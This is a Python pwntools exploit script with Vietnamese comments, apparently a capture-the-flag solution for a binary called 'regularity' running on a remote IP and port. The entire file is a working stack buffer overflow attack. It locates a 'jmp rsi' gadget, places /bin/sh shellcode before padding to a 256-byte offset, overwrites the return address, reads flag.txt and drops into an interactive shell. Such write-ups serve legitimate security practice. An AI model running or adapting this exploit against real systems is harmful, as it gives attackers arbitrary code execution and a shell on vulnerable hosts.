#!/usr/bin/env python3
from sys import argv
from pwn import *

# --- Cấu hình ---
exe = context.binary = ELF(args.EXE or 'regularity')

# context.log_level = "INFO"
context(terminal=['tmux', 'split-window', '-h'])

host = '94.237.55.43'
port = 42565

def start(argv=[], *a, **kw):
    if args.REMOTE:
        io = remote(host, port)
        if args.GDB:
            gdb.attach(io, gdbscript=gdbscript)
        return io
    else:
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

io = start()

# ===========================================================
#                    EXPLOIT ĐÚNG
# ===========================================================

# 1. Tự động tìm gadget 'jmp rsi'
log.info("Đang tự động tìm gadget 'jmp rsi'...")
# next() lấy kết quả đầu tiên tìm thấy
jmp_rsi_gadget = next(exe.search(asm('jmp rsi')))
log.success(f"Tìm thấy 'jmp rsi' tại địa chỉ: {hex(jmp_rsi_gadget)}")

# 2. Tạo shellcode
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode đã được tạo (dài {len(shellcode)} bytes)")

# 3. Xây dựng payload với offset ĐÚNG LÀ 256
offset_to_saved_rbp = 256
padding_size = offset_to_saved_rbp - len(shellcode)
payload = shellcode + b'A' * padding_size + p64(jmp_rsi_gadget)

log.info(f"Payload cuối cùng đã được xây dựng (dài {len(payload)} bytes).")

# 4. Gửi payload
io.send(payload)
log.success("Payload đã được gửi!")

io.clean()

# 5. Tương tác với shell
log.info("Chuyển sang chế độ tương tác. Gõ lệnh như 'ls' hoặc 'cat flag.txt'")

io.sendline(b'cat flag.txt')
warning('Flag: ' + io.recv().decode('utf-8'))

io.interactive()